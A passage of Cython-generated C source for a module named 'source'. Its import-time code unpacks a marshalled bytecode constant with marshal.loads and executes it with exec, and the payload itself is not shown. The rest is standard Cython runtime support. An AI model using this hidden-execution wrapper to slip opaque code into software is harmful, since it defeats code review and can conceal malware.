    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* PyExecGlobals */
static PyObject* __Pyx_PyExecGlobals(PyObject* code) {
    PyObject* result;
    PyObject* globals = __Pyx_Globals();
    if (unlikely(!globals))
        return NULL;
    result = __Pyx_PyExec2(code, globals);
    Py_DECREF(globals);
    return result;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
